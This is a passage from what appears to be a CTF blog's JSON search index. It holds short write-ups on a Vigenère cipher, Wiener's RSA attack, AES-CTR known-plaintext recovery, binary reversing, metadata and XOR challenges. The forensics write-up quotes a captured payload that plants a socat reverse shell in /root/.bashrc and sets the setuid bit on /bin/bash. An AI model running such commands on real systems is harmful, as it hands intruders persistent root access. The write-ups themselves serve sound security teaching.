206.189.125.80:30580 [*] './vault-breaker' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./.glibc/' [+] Opening connection to 206.189.125.80 on port 30580: Done [◓] Number: 0 [*] Closed connection to 206.189.125.80 port 30580 HTB{d4nz4_kudur0r0r0}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/pwn/vault-breaker/","section":"ctf","summary":"64-bit binary. Bug abuse. XOR cipher","time":5,"title":"Vault-breaker"},{"contents":"We are given this ciphertext:\nDETctysy{QzeffcgRgcBhsjdkf}  And we also have a strange word: blorpy.\nSince the challenge is called \u0026ldquo;Vigenère Cipher\u0026rdquo;, we can guess that the encryption algorithm is precisely Vigenère cipher, which is a type of Caesar substitution algorithm. To decrypt the message, we can go to CyberChef and use blorpy as key:\nFlag: CTFlearn{CiphersAreAwesome}.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/cryptography/vigenere-cipher/","section":"ctf","summary":"Vigenère decryption","time":1,"title":"Vigenère Cipher"},{"contents":"We are given a public key in PEM format for an RSA implementation (key.pub):\n-----BEGIN PUBLIC KEY----- MIIBHzANBgkqhkiG9w0BAQEFAAOCAQwAMIIBBwKBgQMwO3kPsUnaNAbUlaubn7ip 4pNEXjvUOxjvLwUhtybr6Ng4undLtSQPCPf7ygoUKh1KYeqXMpTmhKjRos3xioTy 23CZuOl3WIsLiRKSVYyqBc9d8rxjNMXuUIOiNO38ealcR4p44zfHI66INPuKmTG3 RQP/6p5hv1PYcWmErEeDewKBgGEXxgRIsTlFGrW2C2JXoSvakMCWD60eAH0W2PpD qlqqOFD8JA5UFK0roQkOjhLWSVu8c6DLpWJQQlXHPqP702qIg/gx2o0bm4EzrCEJ 4gYo6Ax+U7q6TOWhQpiBHnC0ojE8kUoqMhfALpUaruTJ6zmj8IA1e1M6bMqVF8sr lb/N -----END PUBLIC KEY-----  $ python3 -q \u0026gt;\u0026gt;\u0026gt; from Crypto.PublicKey import RSA \u0026gt;\u0026gt;\u0026gt; key = RSA.import_key(open('key.pub').read()) \u0026gt;\u0026gt;\u0026gt; key.n 573177824579630911668469272712547865443556654086190104722795509756891670023259031275433509121481030331598569379383505928315495462888788593695945321417676298471525243254143375622365552296949413920679290535717172319562064308937342567483690486592868352763021360051776130919666984258847567032959931761686072492923 \u0026gt;\u0026gt;\u0026gt; key.e 68180928631284147212820507192605734632035524131139938618069575375591806315288775310503696874509130847529572462608728019290710149661300246138036579342079580434777344111245495187927881132138357958744974243365962204835089753987667395511682829391276714359582055290140617797814443530797154040685978229936907206605  RSA works as follows: We take two large primes $p$ and $q$ and set the modulus $n = pq$. Then we choose an exponent $e$ (typically $e = 65537$) and encrypt a message $m$ in decimal format:\n$$ c = m^e \\pmod{n} $$\nThe public key is the tuple $(n, e)$, and the private key is composed of the two prime numbers. To decrypt, we need to compute $\\phi(n) = (p - 1) (q - 1)$ in order to find the multiplicative inverse of $e$, which is $d = e^{-1} \\pmod{\\phi(n)}$. Then the decryption of $c$ is:\n$$ m = c^d \\pmod{n} $$\nThis works because\n$$ c = m^e \\pmod{n} \\iff c^d = (m^e)^d = m^{ed} = m \\pmod{n} $$\nThe problem of this RSA implementation is that $e$ is really big. This fact makes it vulnerable to Wiener\u0026rsquo;s attack. We can use owiener Python module to extract the private exponent $d$:\n\u0026gt;\u0026gt;\u0026gt; import owiener \u0026gt;\u0026gt;\u0026gt; d = owiener.attack(key.e, key.n) \u0026gt;\u0026gt;\u0026gt; d 44217944188473654528518593968293401521897205851340809945591908757815783834933  At this point, we can decrypt the flag (available in flag.enc):\n\u0026gt;\u0026gt;\u0026gt; c = int(open('flag.enc', 'rb').read().hex(), 16) \u0026gt;\u0026gt;\u0026gt; m = pow(c, d, key.n) \u0026gt;\u0026gt;\u0026gt; from Crypto.Util.number import long_to_bytes \u0026gt;\u0026gt;\u0026gt; long_to_bytes(m) b'\\x02!\\xcf\\xb2\\x98\\x83\\xb0o@\\x9ag\\x9aX\\xa4\\xe9{Dn(\\xb2D\\xbb\\xcd\\x06\\x87\\xd1x\\xa8\\xab\\x87\"\\xbf\\x86\\xda\\x06\\xa6.\\x04,\\x89-)!\\xb36W\\x1e\\x9f\\xf7\\xac\\x9d\\x89\\xba\\x90Q+\\xacL\\xfb\\x8d~J9\\x01\\xbb\\xcc\\xf5\\xdf\\xac\\x01\\xb2{\\xdd\\xd3_\\x1c\\xa5SD\\xa7YC\\xdf\\x9a\\x18\\xea\\xdb4L\\xf7\\xcfU\\xfa\\x0b\\xaap\\x05\\xbf\\xe3/A\\x00HTB{s1mpl3_Wi3n3rs_4tt4ck}' \u0026gt;\u0026gt;\u0026gt; long_to_bytes(m).split(b'\\0')[-1] b'HTB{s1mpl3_Wi3n3rs_4tt4ck}'  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/crypto/weak-rsa/","section":"ctf","summary":"RSA. Wiener's attack","time":2,"title":"Weak RSA"},{"contents":"We are given a remote instance to connect to. If we stablish the connection with nc, we get the flag:\n$ nc jupiter.challenges.picoctf.org 25103 You're on your way to becoming the net cat master picoCTF{nEtCat_Mast3ry_d0c64587}  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/general-skills/whats-a-net-cat/","section":"ctf","summary":"picoCTF 2019. 100 points. Connect to a remote instance","time":1,"title":"what's a net cat?"},{"contents":"We are given a website like this:\nThe page talks about robots. There is a special file called robots.txt that prevents web crawlers and spiders to access some routes listed on the file. Let\u0026rsquo;s take a look:\nAlright, there is a Disallow: /8028f.html, which does not mean that we cannot enter (it only tells automatic scanners not to enter). This is /8028f.html:\nAnd there\u0026rsquo;s the flag: picoCTF{ca1cu1at1ng_Mach1n3s_8028f}.\n","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/web-exploitation/where-are-the-robots/","section":"ctf","summary":"picoCTF 2019. 100 points. robots.txt","time":1,"title":"where are the robots"},{"contents":"We got the Python source code of the server:\nfromencryptimportEncryptor fromsecretimportFLAG importsocketserver importrandom importsignal importjson MODES=['ECB', 'CBC', 'CFB', 'OFB', 'CTR'] classHandler(socketserver.BaseRequestHandler): defhandle(self): signal.alarm(0) main(self.request) classReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass defsendMessage(s, msg): s.send(msg.encode()) defreceiveMessage(s, msg): sendMessage(s, msg) returns.recv(4096).decode().strip() defmain(s): mode=random.choice(MODES) enc=Encryptor() whileTrue: try: sendMessage(s, f\"Please interact with the server using json data!\\n\") sendMessage(s, f\"Selected mode is {mode}.\\n\") payload=receiveMessage( s, \"\\nOptions:\\n\\n1.Encrypt flag\\n2.Encrypt plaintext\\n3.Change mode\\n4.Exit\\n\\n\u0026gt; \" ) payload=json.loads(payload) option=payload[\"option\"] ifoption==\"1\": ciphertext=enc.encrypt(FLAG, mode).hex() response=json.dumps({ \"response\": \"encrypted\", \"ciphertext\": ciphertext }) sendMessage(s, \"\\n\"+response+\"\\n\") elifoption==\"2\": payload=receiveMessage(s, \"Enter plaintext: \\n\") payload=json.loads(payload) plaintext=payload['plaintext'].encode() ciphertext=enc.encrypt(plaintext, mode).hex() response=json.dumps({ \"response\": \"encrypted\", \"ciphertext\": ciphertext }) sendMessage(s, \"\\n\"+response+\"\\n\") elifoption==\"3\": response=json.dumps({\"modes\": MODES}) sendMessage( s, \"These are the supported modes\\n\"+response+\"\\n\") payload=receiveMessage(s, \"Expecting modes: \\n\") payload=json.loads(payload) mode=random.choice(payload['modes']) elifoption==\"4\": sendMessage(s, \"Bye bye\\n\") exit() exceptExceptionase: response=json.dumps({\"response\": \"error\", \"message\": str(e)}) sendMessage(s, \"\\n\"+response+\"\\n\") exit() if__name__==\"__main__\": socketserver.TCPServer.allow_reuse_address=True server=ReusableTCPServer((\"0.0.0.0\", 1337), Handler) server.serve_forever()  Basically, we have these options:\n$ nc 134.122.106.203 32569 Please interact with the server using json data! Selected mode is CBC. Options: 1.Encrypt flag 2.Encrypt plaintext 3.Change mode 4.Exit \u0026gt;  AES modes We are able to select AES operation mode. We have the following ones:\n AES ECB AES CBC AES CFA AES OFB AES CTR  All of them have their own configuration. However, the last one is actually a stream cipher:\nSo AES is only used to generate a bit stream that will be operated with XOR against the plaintext bits.\nKnown plaintext attack Since we can get the flag encrypted with AES CTR and also send arbitrary plaintext to encrypt them using the same AES CTR cipher, we will be able to perform a known plaintext attack.\nWe have this:\n$$ \\mathrm{enc\\_flag} = \\mathrm{flag} \\oplus \\mathrm{key} $$\nThen, we can send an arbitrary plaintext $\\mathrm{pt}$ and obtain\n$$ \\mathrm{enc\\_pt} = \\mathrm{pt} \\oplus \\mathrm{key} $$\nBecause of XOR properties, we can find the $\\mathrm{key}$ (which is the bit stream generated by AES CTR):\n$$ \\mathrm{key} = \\mathrm{pt} \\oplus \\mathrm{enc\\_pt} $$\nAnd therefore\n$$ \\mathrm{flag} = \\mathrm{enc\\_{flag}} \\oplus \\mathrm{key} = \\mathrm{enc\\_flag} \\oplus \\mathrm{pt} \\oplus \\mathrm{enc\\_pt} $$\nPerforming the attack The server will choose an AES mode randomly, we can try several times until we get AES CTR (we could have also switched manually):\n$ nc 134.122.106.203 32569 Please interact with the server using json data! Selected mode is CTR. Options: 1.Encrypt flag 2.Encrypt plaintext 3.Change mode 4.Exit \u0026gt;  We need to interact with the server in JSON format:\n\u0026gt; {\"option\":\"1\"} {\"response\": \"encrypted\", \"ciphertext\": \"ea3796cdc335cce6d497440aede26313cd8726e16c74e069874d952314f60b1a31579ea2dbe9e09101ac8208437139148ffe4512e6f92f46135011849886e300\"} Please interact with the server using json data! Selected mode is CTR. Options: 1.Encrypt flag 2.Encrypt plaintext 3.Change mode 4.Exit \u0026gt;  Now we will use a known plaintext of the same size as $\\mathrm{enc\\_flag}$:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; len('ea3796cdc335cce6d497440aede26313cd8726e16c74e069874d952314f60b1a31579ea2dbe9e09101ac8208437139148ffe4512e6f92f46135011849886e300') 128 \u0026gt;\u0026gt;\u0026gt; 'A' * (128 // 2) 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'  Now we enter this plaintext:\n\u0026gt; {\"option\":\"2\"} Enter plaintext: {\"plaintext\":\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"} {\"response\": \"encrypted\", \"ciphertext\": \"e32295f7b744d2caa1b87c14c1934661b99901901f6acb5df33b8b560adc246b07788093ab9c90be77debb7e5d044f62fadc6f0c97d6314617427d868d95df4010a8f9a051e1cd0b8b224062f9ab70b7\"} Please interact with the server using json data! Selected mode is CTR. Options: 1.Encrypt flag 2.Encrypt plaintext 3.Change mode 4.Exit \u0026gt;  Flag At this point, we can use xor from pwntools to do the above computation and find the flag:\n\u0026gt;\u0026gt;\u0026gt; from pwn import xor \u0026gt;\u0026gt;\u0026gt; xor( ... bytes.fromhex('ea3796cdc335cce6d497440aede26313cd8726e16c74e069874d952314f60b1a31579ea2dbe9e09101ac8208437139148ffe4512e6f92f46135011849886e300'), ... b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA', ... bytes.fromhex('e32295f7b744d2caa1b87c14c1934661b99901901f6acb5df33b8b560adc246b07788093ab9c90be77debb7e5d044f62fadc6f0c97d6314617427d868d95df4010a8f9a051e1cd0b8b224062f9ab70b7') ... ) b'HTB{50_m4ny_m0d35_f02_ju57_4_kn0wn_p141n73x7_4774ck_0n_AES-CTR}\\x01\\xbb\\xde.,\\xd3\\x95@\\xac\\x1e\\xf4E)U\\x08R\\xe5'  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/crypto/whole-lotta-candy/","section":"ctf","summary":"AES cipher modes. Stream cipher. Known plaintext attack","time":3,"title":"Whole Lotta Candy"},{"contents":"We got the Python source code of the server:\nfromencryptimportEncryptor fromsecretimportFLAG importsocketserver importrandom importsignal importjson MODES=['ECB', 'CBC', 'CFB', 'OFB', 'CTR'] classHandler(socketserver.BaseRequestHandler): defhandle(self): signal.alarm(0) main(self.request) classReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass defsendMessage(s, msg): s.send(msg.encode()) defreceiveMessage(s, msg): sendMessage(s, msg) returns.recv(4096).decode().strip() defmain(s): mode=random.choice(MODES) enc=Encryptor() whileTrue: try: sendMessage(s, f\"Please interact with the server using json data!\\n\") sendMessage(s, f\"Selected mode is {mode}.\\n\") payload=receiveMessage( s, \"\\nOptions:\\n\\n1.Encrypt flag\\n2.Encrypt plaintext\\n3.Change mode\\n4.Exit\\n\\n\u0026gt; \" ) payload=json.loads(payload) option=payload[\"option\"] ifoption==\"1\": ciphertext=enc.encrypt(FLAG, mode).hex() response=json.dumps({ \"response\": \"encrypted\", \"ciphertext\": ciphertext }) sendMessage(s, \"\\n\"+response+\"\\n\") elifoption==\"2\": payload=receiveMessage(s, \"Enter plaintext: \\n\") payload=json.loads(payload) plaintext=payload['plaintext'].encode() ciphertext=enc.encrypt(plaintext, mode).hex() response=json.dumps({ \"response\": \"encrypted\", \"ciphertext\": ciphertext }) sendMessage(s, \"\\n\"+response+\"\\n\") elifoption==\"3\": response=json.dumps({\"modes\": MODES}) sendMessage( s, \"These are the supported modes\\n\"+response+\"\\n\") payload=receiveMessage(s, \"Expecting modes: \\n\") payload=json.loads(payload) mode=random.choice(payload['modes']) elifoption==\"4\": sendMessage(s, \"Bye bye\\n\") exit() exceptExceptionase: response=json.dumps({\"response\": \"error\", \"message\": str(e)}) sendMessage(s, \"\\n\"+response+\"\\n\") exit() if__name__==\"__main__\": socketserver.TCPServer.allow_reuse_address=True server=ReusableTCPServer((\"0.0.0.0\", 1337), Handler) server.serve_forever()  Basically, we have these options:\n$ nc 134.122.106.203 32569 Please interact with the server using json data! Selected mode is CBC. Options: 1.Encrypt flag 2.Encrypt plaintext 3.Change mode 4.Exit \u0026gt;  AES modes We are able to select AES operation mode. We have the following ones:\n AES ECB AES CBC AES CFA AES OFB AES CTR  All of them have their own configuration. However, the last one is actually a stream cipher:\nSo AES is only used to generate a bit stream that will be operated with XOR against the plaintext bits.\nKnown plaintext attack Since we can get the flag encrypted with AES CTR and also send arbitrary plaintext to encrypt them using the same AES CTR cipher, we will be able to perform a known plaintext attack.\nWe have this:\n$$ \\mathrm{enc\\_flag} = \\mathrm{flag} \\oplus \\mathrm{key} $$\nThen, we can send an arbitrary plaintext $\\mathrm{pt}$ and obtain\n$$ \\mathrm{enc\\_pt} = \\mathrm{pt} \\oplus \\mathrm{key} $$\nBecause of XOR properties, we can find the $\\mathrm{key}$ (which is the bit stream generated by AES CTR):\n$$ \\mathrm{key} = \\mathrm{pt} \\oplus \\mathrm{enc\\_pt} $$\nAnd therefore\n$$ \\mathrm{flag} = \\mathrm{enc\\_{flag}} \\oplus \\mathrm{key} = \\mathrm{enc\\_flag} \\oplus \\mathrm{pt} \\oplus \\mathrm{enc\\_pt} $$\nPerforming the attack The server will choose an AES mode randomly, we can try several times until we get AES CTR (we could have also switched manually):\n$ nc 134.122.106.203 32569 Please interact with the server using json data! Selected mode is CTR. Options: 1.Encrypt flag 2.Encrypt plaintext 3.Change mode 4.Exit \u0026gt;  We need to interact with the server in JSON format:\n\u0026gt; {\"option\":\"1\"} {\"response\": \"encrypted\", \"ciphertext\": \"2c5c510aa63626153609ef888b65262fdd7533a69e3bd40aa1535f22119a9bd76bbdb4d48af8b70acfd7123178b27087eb6750d5456b6a8c66a492aa318d5ad5\"} Please interact with the server using json data! Selected mode is CTR. Options: 1.Encrypt flag 2.Encrypt plaintext 3.Change mode 4.Exit \u0026gt;  Now we will use a known plaintext of the same size as $\\mathrm{enc\\_flag}$:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; len('2c5c510aa63626153609ef888b65262fdd7533a69e3bd40aa1535f22119a9bd76bbdb4d48af8b70acfd7123178b27087eb6750d5456b6a8c66a492aa318d5ad5') 128 \u0026gt;\u0026gt;\u0026gt; 'A' * (128 // 2) 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'  Now we enter this plaintext:\n\u0026gt; {\"option\":\"2\"} Enter plaintext: {\"plaintext\":\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"} {\"response\": \"encrypted\", \"ciphertext\": \"25495230ac1928033917dea5ab152959af030ad0801ba27c8151753c3ceae3fe1dc9aaa2838aa93ccfcf0c4751815e93936e4ef9456452926a8ab7d80ab1199681351921db33f74fbd6dce2435c4b20e\"} Please interact with the server using json data! Selected mode is CTR. Options: 1.Encrypt flag 2.Encrypt plaintext 3.Change mode 4.Exit \u0026gt;  Flag At this point, we can use xor from pwntools to do the above computation and find the flag:\n\u0026gt;\u0026gt;\u0026gt; from pwn import xor \u0026gt;\u0026gt;\u0026gt; xor( ... bytes.fromhex('2c5c510aa63626153609ef888b65262fdd7533a69e3bd40aa1535f22119a9bd76bbdb4d48af8b70acfd7123178b27087eb6750d5456b6a8c66a492aa318d5ad5'), ... b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA', ... bytes.fromhex('25495230ac1928033917dea5ab152959af030ad0801ba27c8151753c3ceae3fe1dc9aaa2838aa93ccfcf0c4751815e93936e4ef9456452926a8ab7d80ab1199681351921db33f74fbd6dce2435c4b20e') ... ) b'HTB{KnOWN_pla1N737x7_a77aCk_l19h75_7H3_wAY_7hroU9H_mANy_Mod3z}\\x02\\x02\\xec(\\tj\u0026lt;D\\x90\\x1b\\xca%`\\xed\\xff\\xe0\\xd5`'  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/whole-lotta-candy/","section":"ctf","summary":"AES cipher modes. Stream cipher. Known plaintext attack","time":3,"title":"Whole Lotta Candy"},{"contents":"We are given a 64-bit binary file called wide and another file called db.ex with some strings:\n$ file wide wide: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=13869bb7ce2c22f474b95ba21c9d7e9ff74ecc3f, not stripped $ strings db.ex Primus people breathe variety practice Our home dimension Cheagaz scene control river importance The Ice Dimension Byenoovia fighting cast it parallel The Berserk Dimension Cloteprea facing motor unusual heavy The Hungry Dimension Maraqa stomach motion sale valuable The Water Dimension Aidor feathers stream sides gate The Bone Dimension Flaggle Alpha admin secret power hidden HOt* 0ANe  If we run the binary we have this:\n$ ./wide Usage: ./wide db.ex $ ./wide db.ex [*] Welcome user: kr4eq4L2$12xb, to the Widely Inflated Dimension Editor [*] [*] Serving your pocket dimension storage needs since 14,012.5 B [*] [*] Displaying Dimensions.... [*] [*] Name | Code | Encrypted [*] [X] Primus | people breathe variety practice | [*] [X] Cheagaz | scene control river importance | [*] [X] Byenoovia | fighting cast it parallel | [*] [X] Cloteprea | facing motor unusual heavy | [*] [X] Maraqa | stomach motion sale valuable | [*] [X] Aidor | feathers stream sides gate | [*] [X] Flaggle Alpha | admin secret power hidden | * [*] Which dimension would you like to examine? 6 [X] That entry is encrypted - please enter your WIDE decryption key:  The sixth option seems to be the one that will return the flag, but we need a decryption key.\nIf we use Ghidra to analyze the binary, we will see the main function:\nundefined8 main(intparam_1, undefined8 *param_2) { intiVar1; FILE *__stream; ulong uVar2; void*__ptr; uintuVar3; inti;  if(param_1 \u0026lt;2) { printf(\"Usage: %sdb.ex\\n\", *param_2); /* WARNING: Subroutine does not return */ exit(-1); } puts(\"[*] Welcome user: kr4eq4L2$12xb, to the Widely Inflated Dimension Editor [*]\"); puts(\"[*] Serving your pocket dimension storage needs since 14,012.5 B [*]\"); __stream =fopen((char*) param_2[1], \"r\"); if(__stream ==(FILE *) 0x0) { puts(\"[x] There was a problem accessing your database [x]\"); /* WARNING: Subroutine does not return */ exit(-1); } fseek(__stream, 0, 2); uVar2 =ftell(__stream); fseek(__stream, 0, 0); uVar2 =(uVar2 -uVar2 %0xb4) /0xb4; iVar1 =(int) uVar2; __ptr =calloc((long) iVar1,0xb4); fread(__ptr, 0xb4,(long) iVar1, __stream); fclose(__stream); puts(\"[*] Displaying Dimensions.... [*]\"); puts(\"[*] Name | Code | Encrypted [*]\"); for(i =0; i \u0026lt;iVar1; i =i +1) { if(*(int*) ((long) __ptr +(long) i *0xb4) ==0) { uVar3 =0x20; } else{ uVar3 =0x2a; } printf(\"[X] %-16s| %-32s| %6s%c%7s[*]\\n\", (long) __ptr +(long) i *0xb4+4, (long) __ptr +(long) i *0xb4+0x14, \u0026amp;DAT_0010132d, (ulong) uVar3, \u0026amp;DAT_0010132d); } menu(__ptr, uVar2 \u0026amp;0xffffffff); return0; }  At the end, there is another function called menu:\nvoidmenu(longparam_1, intparam_2) { intiVar1; longlVar2; undefined8 *puVar3; longin_FS_OFFSET; uinti; wchar_tlocal_1c8[16]; undefined8 local_188; // ... undefined8 local_10;  local_10 =*(undefined8 *) (in_FS_OFFSET +0x28); local_b8 =0; local_b0 =0; local_a8 =0; local_a0 =0; do{ while(true) { while(true) { printf(\"Which dimension would you like to examine? \"); fgets((char*) \u0026amp;local_b8, 0x20, stdin); lVar2 =strtol((char*) \u0026amp;local_b8, (char**) 0x0, 10); iVar1 =(int) lVar2; if((-1\u0026lt;iVar1) \u0026amp;\u0026amp;(iVar1 \u0026lt;param_2)) break; puts(\"That option was invalid.\"); } puVar3 =(undefined8 *) (param_1 +(long) iVar1 *0xb4); local_188 =*puVar3; local_180 =puVar3[1]; local_178 =puVar3[2]; local_170 =puVar3[3]; local_168 =puVar3[4]; local_160 =puVar3[5]; local_158 =(undefined4) puVar3[6]; uStack340 =(undefined4) ((ulong) puVar3[6] \u0026gt;\u0026gt;0x20); // ... uStack220 =(undefined4) ((ulong) puVar3[0x15] \u0026gt;\u0026gt;0x20); local_d8 =*(undefined4 *) (puVar3 +0x16); if((int) local_188 !=0) break; puts((char*) \u0026amp;uStack340); } local_98 =CONCAT44(local_150, uStack340); // ... local_20 =CONCAT44(local_d8, uStack220); printf(\"[X] That entry is encrypted - please enter your WIDE decryption key: \"); fgets(local_c8, 0x10, stdin); mbstowcs(local_1c8, local_c8, 0x10); iVar1 =wcscmp(local_1c8, L\"sup3rs3cr3tw1d3\"); if(iVar1 ==0) { for(i =0; (i \u0026lt;0x80\u0026amp;\u0026amp;(*(char*) ((long) \u0026amp;local_98 +(long) (int) i) !='\\0')); i =i +1) { *(byte *) ((long) \u0026amp;local_98 +(long) (int) i) = *(byte *)((long) \u0026amp;local_98 +(long) (int) i) ^ (char) (i *0x1b) +(char) ((int) (i *0x1b) /0xff); } puts((char*) \u0026amp;local_98); } else{ puts(\"[X] Key was incorrect [X]\"); } } while(true); }  And there we have the password: sup3rs3cr3tw1d3. If we use it we will get the flag:\n$ ./wide db.ex [*] Welcome user: kr4eq4L2$12xb, to the Widely Inflated Dimension Editor [*] [*] Serving your pocket dimension storage needs since 14,012.5 B [*] [*] Displaying Dimensions.... [*] [*] Name | Code | Encrypted [*] [X] Primus | people breathe variety practice | [*] [X] Cheagaz | scene control river importance | [*] [X] Byenoovia | fighting cast it parallel | [*] [X] Cloteprea | facing motor unusual heavy | [*] [X] Maraqa | stomach motion sale valuable | [*] [X] Aidor | feathers stream sides gate | [*] [X] Flaggle Alpha | admin secret power hidden | * [*] Which dimension would you like to examine? 6 [X] That entry is encrypted - please enter your WIDE decryption key: sup3rs3cr3tw1d3 HTB{som3_str1ng5_4r3_w1d3}  We can think that this string can be extracted with strings, but it is not. The issue is that it is separated by null bytes, we can analyze the hexadecimal content of the binary to view it:\n$ strings wide | grep sup3rs3cr3tw1d3 $ xxd wide ... 000010d0: 5b58 5d20 5468 6174 2065 6e74 7279 2069 [X] That entry i 000010e0: 7320 656e 6372 7970 7465 6420 2d20 706c s encrypted - pl 000010f0: 6561 7365 2065 6e74 6572 2079 6f75 7220 ease enter your 00001100: 5749 4445 2064 6563 7279 7074 696f 6e20 WIDE decryption 00001110: 6b65 793a 2000 0000 7300 0000 7500 0000 key: ...s...u... 00001120: 7000 0000 3300 0000 7200 0000 7300 0000 p...3...r...s... 00001130: 3300 0000 6300 0000 7200 0000 3300 0000 3...c...r...3... 00001140: 7400 0000 7700 0000 3100 0000 6400 0000 t...w...1...d... 00001150: 3300 0000 0000 0000 5b58 5d20 2020 2020 3.......[X] 00001160: 2020 2020 2020 2020 2020 2020 2020 2020 00001170: 2020 2020 204b 6579 2077 6173 2069 6e63 Key was inc 00001180: 6f72 7265 6374 2020 2020 2020 2020 2020 orrect ...  ","image":"/images/reversing.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/reversing/wide/","section":"ctf","summary":"Key written in a binary","time":5,"title":"WIDE"},{"contents":"We are told to find the flag in this image:\nHowever, the flag is not visible inside the image and it is not hidden in its content. However, we can find the flag in the file metadata.\nWe can use exiftool to extract the file metadata and then filter by CTFlearn using grep:\n$ exiftool 3UWLBAUCb9Z2.jpg | grep CTFlearn Camera Serial Number : CTFlearn{EEe_x_I_FFf}  ","image":"/images/forensics.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/forensics/wow...-so-meta/","section":"ctf","summary":"File metadata","time":1,"title":"WOW... So Meta"},{"contents":"We are given a network traffic capture file called capture.pcap.\nTraffic analysis We can use Wireshark to analyze it:\nHTTP messages There are a lot of packages. Let\u0026rsquo;s filter by HTTP first:\nAlright, we have significanly less packages to analyze.\nThere are some HTTP messages that stand out at the end. We guess that a malicious user is executing remote system commands on the server (cmd=whoami, cmd=id \u0026hellip;). The last message is using socat to obtain a reverse shell connection, we can select this packet and remove the HTTP filter.\nTCP segments Now we have some interesting TCP segments to analyze from the reverse shell connection. For example, we can see the output of command id ina Linux system:\nInspecting a bit more, we see this command being executed:\nWe can format it a bit:\necho'socat TCP:192.168.1.180:1337 EXEC:sh'\u0026gt;/root/.bashrc \u0026amp;\u0026amp;echo\"==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS\"|rev \u0026gt;/dev/null \u0026amp;\u0026amp;chmod +s /bin/bash  The above payload must be the flag somewhat encoded. Let\u0026rsquo;s try to execute the middle section:\n$ echo \"==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS\" | rev SFRCe2o0djRfNXByMW5nX2p1c3RfYjNjNG0zX2o0djRfc3AwMGt5ISF9Cg==  It looks to be Base64-encoded data.\nFlag If we decode the above payload, we will find the flag:\n$ echo \"==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS\" | rev | base64 -d HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}  ","image":"/images/forensics.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/wrong-spooky-season/","section":"ctf","summary":"Network traffic analysis with Wireshark","time":1,"title":"Wrong Spooky Season"},{"contents":"The program says that someone has used a XOR cipher with a single byte key. This is the output: * 7%8-s70\u0026amp; 61\u0026amp;\u0026gt;.\nSince we know that flags start with ictf{, we can get the key using \u0026quot;*\u0026quot; ^ \u0026quot;i\u0026quot; because of XOR cipher properties:\n$$ c = m \\oplus k \\iff k = c \\oplus m $$\nSo we solve the challenge like this:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; from pwn import xor \u0026gt;\u0026gt;\u0026gt; c = b'* 7%8-s70\u0026 61\u0026\u0026gt;' \u0026gt;\u0026gt;\u0026gt; k = xor(c[0], b'i') \u0026gt;\u0026gt;\u0026gt; m = xor(c, k) \u0026gt;\u0026gt;\u0026gt; m b'ictf{n0tsecure}'  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/xored/","section":"ctf","summary":"ImaginaryCTF 02/09/2022. 50 points. XOR cipher","time":1,"title":"XORed"},{"contents":"We are given this source code to encrypt the flag, and also the ciphertext as a comment in the code:\n#!/usr/bin/env python3 flag=open('flag.txt', 'rb').read() key=open('/dev/urandom','rb').read(1)[0] out=[] forcinflag: out.append(c ^ key) key=c print(f'{bytes(out).hex() = }') # bytes(out).hex() = '970a17121d121d2b28181a19083b2f021d0d03030e1526370d091c2f360f392b1c0d3a340e1c263e070003061711013b32021d173a2b1c090f31351f06072b2b1c0d3a390f1b01072b3c0b09132d33030311'  From the source code, we see that the key is a single byte. Moreover, the key is updated with the current plain text character.\nHence, we can use some Python scripting to solve the challenge:\n#!/usr/bin/env python3 defmain(): ct=bytes.fromhex('970a17121d121d2b28181a19083b2f021d0d03030e1526370d091c2f360f392b1c0d3a340e1c263e070003061711013b32021d173a2b1c090f31351f06072b2b1c0d3a390f1b01072b3c0b09132d33030311') key=ord('i') ^ct[0] flag=b'' forbinct: flag+=bytes([b^key]) key=flag[-1] print(flag.decode()) if__name__=='__main__': main()  $ python3 solve.py ictf{it_would_probably_help_if_the_key_affected_more_than_just_the_first_char_lol}  The full script can be found in here: solve.py.\n","image":"/images/reversing.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/xorrot/","section":"ctf","summary":"ImaginaryCTF 07/07/2022. 50 points. XOR cipher with rotating key","time":1,"title":"xorrot"},{"contents":"We have a binary called auth:\n$ file auth auth: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter 